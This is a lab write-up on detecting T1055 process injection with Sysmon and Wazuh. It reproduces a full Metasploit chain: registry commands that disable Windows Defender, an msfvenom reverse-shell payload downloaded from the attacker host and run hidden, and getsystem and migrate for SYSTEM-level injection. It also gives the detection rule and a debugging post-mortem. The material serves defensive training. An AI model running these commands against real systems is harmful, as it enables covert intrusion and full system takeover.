# Week 6: Metasploit & T1055 Process Injection

## Overview

| | |
|---|---|
| **MITRE ATT&CK** | T1055 - Process Injection |
| **Tools** | Metasploit, Meterpreter, Sysmon, Wazuh 4.7.5 |
| **Detection** | Sysmon EventID 10 → Wazuh rule 100021 |

## Environment

```
Kali Linux    192.168.190.130  Attacker
Windows 10    192.168.190.131  Victim (Sysmon64)
Rocky Linux   192.168.190.128  Wazuh Manager (Docker 4.7.5)
```

## Attack Flow

```
msfvenom payload → HTTP transfer → Meterpreter session
→ getsystem (Named Pipe Impersonation)
→ migrate explorer.exe (T1055)
→ Sysmon EventID 10
→ Wazuh rule 100021 alert ✅
```

## Prerequisites

### 1. Disable Windows Defender

```powershell
# UI: Windows Security → Virus & threat protection
# → Manage settings → Tamper Protection OFF (required first)

$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
New-Item -Path $path -Force
New-ItemProperty -Path $path -Name "DisableRealtimeMonitoring"  -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableBehaviorMonitoring"  -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableIOAVProtection"      -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path $path -Name "DisableScriptScanning"      -Value 1 -PropertyType DWORD -Force

# Verify (all must be True)
Get-MpPreference | Select DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableIOAVProtection
```

### 2. Update Sysmon Config

Add EventID 10 (ProcessAccess) to sysmon config:

```xml
<RuleGroup name="Process_Access" groupRelation="or">
  <ProcessAccess onmatch="include">
    <Rule name="T1055_ProcessAccess" groupRelation="or">
      <TargetImage condition="end with">explorer.exe</TargetImage>
      <TargetImage condition="end with">lsass.exe</TargetImage>
    </Rule>
  </ProcessAccess>
</RuleGroup>
```

```powershell
C:\Windows\Sysmon64.exe -c "C:\Users\yhc\Desktop\sysmonconfig_v2.xml"
```

### 3. Add Sysmon Channel to Wazuh Agent

Add to `C:\Program Files (x86)\ossec-agent\ossec.conf`:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

```powershell
Restart-Service WazuhSvc
```

## Execution

### Step 1 — Generate Payload (Kali)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.190.130 \
  LPORT=4444 \
  -f exe -o /tmp/payload.exe
```

### Step 2 — Transfer Payload (Kali)

```bash
cd /tmp && python3 -m http.server 8080
```

### Step 3 — Download & Execute (Windows)

```powershell
New-Item -ItemType Directory -Path "C:\Temp" -Force
Invoke-WebRequest -Uri "http://192.168.190.130:8080/payload.exe" -OutFile "C:\Temp\payload.exe"
Start-Process -FilePath "C:\Temp\payload.exe" -WindowStyle Hidden
```

### Step 4 — Start Listener (Kali)

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.190.130
set LPORT 4444
run
```

### Step 5 — Privilege Escalation & Process Injection (Meterpreter)

```bash
getuid                   # DESKTOP-5408CBA\yhc
getsystem                # NT AUTHORITY\SYSTEM (Named Pipe Impersonation)
getuid                   # Verify SYSTEM
ps | grep explorer       # Find explorer.exe PID
migrate <PID>            # T1055 Process Injection
```

### Step 6 — Verify Detection (Rocky Linux)

```bash
docker exec single-node-wazuh.manager-1 \
  grep "100021\|T1055" /var/ossec/logs/alerts/alerts.json | tail -5
```

## Wazuh Detection Rule

### Rule Chain

```
60000  (decoded_as: windows_eventchannel)
  └─ 60004  (channel: Microsoft-Windows-Sysmon/Operational)
       └─ 61600  (severityValue: INFORMATION)
            └─ 61612  (eventID: ^10$)
                 └─ 100021  (ruleName: T1055_ProcessAccess) ← Our rule
```

### local_rules.xml

```xml
<rule id="100021" level="13">
  <if_group>sysmon_event_10</if_group>
  <field name="win.eventdata.ruleName">T1055_ProcessAccess</field>
  <description>T1055 - Suspicious process access rights - MITRE T1055</description>
  <mitre><id>T1055</id></mitre>
</rule>
```

> **Note**: In Wazuh 4.9.0, `if_sid` does not work for `windows_eventchannel` events.
> Use `if_group` instead. See [Wazuh GitHub Issue](#) for details.

## Detection Result

```json
{
  "timestamp": "2026-05-11T10:14:28.060+0000",
  "rule": {
    "id": "100021",
    "level": 13,
    "description": "T1055 - Suspicious process access rights - MITRE T1055",
    "mitre": {
      "id": ["T1055"],
      "tactic": ["Defense Evasion", "Privilege Escalation"],
      "technique": ["Process Injection"]
    }
  },
  "agent": { "name": "DESKTOP-5408CBA", "ip": "192.168.190.131" },
  "data": {
    "sourceImage": "C:\\Temp\\payload.exe",
    "targetImage": "C:\\Windows\\Explorer.EXE",
    "eventID": "10"
  }
}
```

## Results

| Item | Result |
|------|--------|
| Meterpreter session | ✅ |
| getsystem (Named Pipe Impersonation) | ✅ |
| migrate → explorer.exe | ✅ |
| Sysmon EventID 10 | ✅ |
| Wazuh rule 100021 alert | ✅ |
| MITRE T1055 mapping | ✅ |

---

## Post-Mortem — if_sid vs if_group Discovery

### What Happened

Initially, custom rule `100021` used `if_sid: 61612` and produced zero alerts in Wazuh 4.9.0. This was misidentified as a Wazuh 4.9.0 bug, leading to an unnecessary downgrade to 4.7.5.

After returning to 4.9.0, the built-in rule `92910` was confirmed working (2,454 alerts). Comparing its structure revealed the key difference:

```xml
<!-- Built-in rule 92910 — WORKS in 4.9.0 -->
<if_group>sysmon_event_10</if_group>

<!-- Custom rule 100021 — FAILS in 4.9.0 -->
<if_sid>61612</if_sid>
```

Switching to `if_group` resolved the issue immediately.

### Version Comparison

| Rule | 4.7.5 (if_sid) | 4.9.0 (if_sid) | 4.9.0 (if_group) |
|------|---------------|----------------|-----------------|
| 100021 (custom) | ✅ 1,032 | ❌ 0 | ✅ 11 |
| 92910 (built-in) | - | ✅ 2,454 | ✅ 2,454 |

### Key Takeaway

In Wazuh 4.9.0, custom rules targeting `windows_eventchannel` events must use `if_group` instead of `if_sid`. The `wazuh-logtest` tool incorrectly shows a match for `if_sid` rules, but the live analysisd pipeline does not fire them.

### Related

- [Wazuh GitHub Issue](#) — Breaking change report
- [Troubleshooting](./troubleshooting.md) — Full debug process
